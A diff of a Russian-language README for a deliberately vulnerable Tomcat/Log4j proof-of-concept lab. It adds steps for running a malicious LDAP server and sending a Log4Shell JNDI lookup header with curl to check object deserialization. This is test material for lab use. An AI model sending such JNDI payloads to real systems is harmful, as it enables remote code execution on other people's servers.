@@ -1,4 +1,4 @@
-## log4j-poc
+# log4j-poc
 
 Тестовое веб-приложение на основе Tomcat 10.1 (OpenJDK 21),
 включающее уязвимую версию библиотеки Log4j 2.x версии 2.25
@@ -8,7 +8,7 @@ Tomcat (/usr/local/tomcat/logs/catalina.out). Приложение
 предназначено для целей тестирования и проверки полезных
 нагрузок.
 
-## Сборка и запуск
+# Сборка и запуск
 
 Для сборки и запуска необходима POSIX-совместимая операционная
 система, включающая следующие компоненты:
@@ -37,7 +37,7 @@ docker run -d -p 8080:8080 --add-host=host:host-gateway log4j-poc
 localhost:8080/myapp
 ```
 
-Проверка lookup без добавления полезной нагрузки, например
+# Проверка lookup без добавления полезной нагрузки
 
 ```
 (
@@ -59,6 +59,39 @@ docker pull sercher78/sercher:log4j-poc-small
 
 ```
 docker run -d -p 8080:8080 --add-host=host:host-gateway sercher78/sercher:log4j-poc-small
+```
+
+# Проверка сериализации с добавлением полезной нагрузки
+
+- maven
+- сборка LDAP сервера (см. [ldap-server](https://github.com/sercher/ldap-server))
+
+```
+git clone https://github.com/sercher/ldap-server.git
+cd ldap-server
+mvn clean compile assembly:single
+```
+
+- запуск LDAP сервера
+
+```
+java -cp target/ldap-server-1.0-SNAPSHOT-jar-with-dependencies.jar LdapServer &
+```
+
+- проверка сериализации
+
+```
+(
+  curl -H 'Header-poc: ${jndi:ldap://host:1389/a}' 'http://localhost:8080/myapp/' &>/dev/null && \
+  docker exec -it $(docker ps -lq) cat /usr/local/tomcat/logs/catalina.out | grep OBJECT-DESERIALIZED && echo '[!] HIGHLY VULNERABLE TO LOG4SHELL'
+)
+```
+
+- остановка LDAP сервера
+
+```
+fg
+нажать <CTRL-C>
 ```
 
 Отчет об уязвимостях docker hub:
